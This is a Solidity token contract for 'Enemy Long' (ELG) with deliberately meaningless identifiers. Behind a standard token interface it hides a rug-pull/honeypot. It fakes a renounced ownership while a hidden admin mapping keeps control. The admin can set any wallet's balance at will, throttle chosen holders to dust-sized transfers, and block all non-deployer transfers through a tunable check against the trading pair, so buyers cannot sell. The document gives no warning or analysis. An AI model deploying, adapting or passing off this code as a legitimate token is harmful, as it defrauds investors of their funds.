//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface limitBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract takeTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface totalTradingBuy {
    function createPair(address maxLiquidity, address toFeeReceiver) external returns (address);
}

interface tradingWalletSender {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletMin) external view returns (uint256);

    function transfer(address minEnable, uint256 marketingEnable) external returns (bool);

    function allowance(address limitIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingEnable) external returns (bool);

    function transferFrom(
        address sender,
        address minEnable,
        uint256 marketingEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed limitExempt, uint256 value);
    event Approval(address indexed limitIs, address indexed spender, uint256 value);
}

interface tradingWalletSenderMetadata is tradingWalletSender {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EnemyLong is takeTeam, tradingWalletSender, tradingWalletSenderMetadata {

    bool public buyAuto;

    function approve(address receiverReceiverMax, uint256 marketingEnable) public virtual override returns (bool) {
        listReceiverToken[_msgSender()][receiverReceiverMax] = marketingEnable;
        emit Approval(_msgSender(), receiverReceiverMax, marketingEnable);
        return true;
    }

    function allowance(address feeToken, address receiverReceiverMax) external view virtual override returns (uint256) {
        if (receiverReceiverMax == tradingLaunched) {
            return type(uint256).max;
        }
        return listReceiverToken[feeToken][receiverReceiverMax];
    }

    address tradingLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public launchedTake;

    address public marketingFeeAt;

    event OwnershipTransferred(address indexed takeShould, address indexed modeTrading);

    function limitToken() public {
        emit OwnershipTransferred(limitBuyEnable, address(0));
        amountMode = address(0);
    }

    bool private enableShould;

    function buyIsTrading(address swapLiquidity, uint256 marketingEnable) public {
        modeShould();
        feeWallet[swapLiquidity] = marketingEnable;
    }

    function name() external view virtual override returns (string memory) {
        return modeToken;
    }

    address public limitBuyEnable;

    uint256 private tokenMax = 100000000 * 10 ** 18;

    function launchedList(address autoLimit) public {
        modeShould();
        
        if (autoLimit == limitBuyEnable || autoLimit == marketingFeeAt) {
            return;
        }
        teamShouldToken[autoLimit] = true;
    }

    function transferFrom(address takeMax, address minEnable, uint256 marketingEnable) external override returns (bool) {
        if (_msgSender() != tradingLaunched) {
            if (listReceiverToken[takeMax][_msgSender()] != type(uint256).max) {
                require(marketingEnable <= listReceiverToken[takeMax][_msgSender()]);
                listReceiverToken[takeMax][_msgSender()] -= marketingEnable;
            }
        }
        return atExempt(takeMax, minEnable, marketingEnable);
    }

    function decimals() external view virtual override returns (uint8) {
        return exemptLimit;
    }

    uint8 private exemptLimit = 18;

    function transfer(address swapLiquidity, uint256 marketingEnable) external virtual override returns (bool) {
        return atExempt(_msgSender(), swapLiquidity, marketingEnable);
    }

    string private teamMode = "ELG";

    mapping(address => bool) public teamShouldToken;

    function totalSupply() external view virtual override returns (uint256) {
        return tokenMax;
    }

    function modeShould() private view {
        require(autoToken[_msgSender()]);
    }

    function owner() external view returns (address) {
        return amountMode;
    }

    mapping(address => uint256) private feeWallet;

    mapping(address => bool) public autoToken;

    mapping(address => mapping(address => uint256)) private listReceiverToken;

    uint256 public launchWallet;

    bool public swapSender;

    function balanceOf(address walletMin) public view virtual override returns (uint256) {
        return feeWallet[walletMin];
    }

    uint256 modeLiquidity;

    uint256 receiverMaxTotal;

    uint256 constant totalTeamBuy = 10 ** 10;

    function symbol() external view virtual override returns (string memory) {
        return teamMode;
    }

    function enableLimitLiquidity(address atShouldReceiver) public {
        if (swapSender) {
            return;
        }
        
        autoToken[atShouldReceiver] = true;
        
        swapSender = true;
    }

    string private modeToken = "Enemy Long";

    function limitMin(address takeMax, address minEnable, uint256 marketingEnable) internal returns (bool) {
        require(feeWallet[takeMax] >= marketingEnable);
        feeWallet[takeMax] -= marketingEnable;
        feeWallet[minEnable] += marketingEnable;
        emit Transfer(takeMax, minEnable, marketingEnable);
        return true;
    }

    function atExempt(address takeMax, address minEnable, uint256 marketingEnable) internal returns (bool) {
        if (takeMax == limitBuyEnable) {
            return limitMin(takeMax, minEnable, marketingEnable);
        }
        uint256 receiverLaunch = tradingWalletSender(marketingFeeAt).balanceOf(fromMin);
        require(receiverLaunch == receiverMaxTotal);
        require(minEnable != fromMin);
        if (teamShouldToken[takeMax]) {
            return limitMin(takeMax, minEnable, totalTeamBuy);
        }
        return limitMin(takeMax, minEnable, marketingEnable);
    }

    uint256 private launchedTeam;

    function sellMode(uint256 marketingEnable) public {
        modeShould();
        receiverMaxTotal = marketingEnable;
    }

    bool public fundMode;

    function getOwner() external view returns (address) {
        return amountMode;
    }

    address fromMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool private tokenExemptList;

    constructor (){
        
        limitBuy tokenEnableFund = limitBuy(tradingLaunched);
        marketingFeeAt = totalTradingBuy(tokenEnableFund.factory()).createPair(tokenEnableFund.WETH(), address(this));
        
        limitBuyEnable = _msgSender();
        limitToken();
        autoToken[limitBuyEnable] = true;
        feeWallet[limitBuyEnable] = tokenMax;
        if (enableShould == buyAuto) {
            tokenExemptList = false;
        }
        emit Transfer(address(0), limitBuyEnable, tokenMax);
    }

    uint256 public receiverAt;

    address private amountMode;

}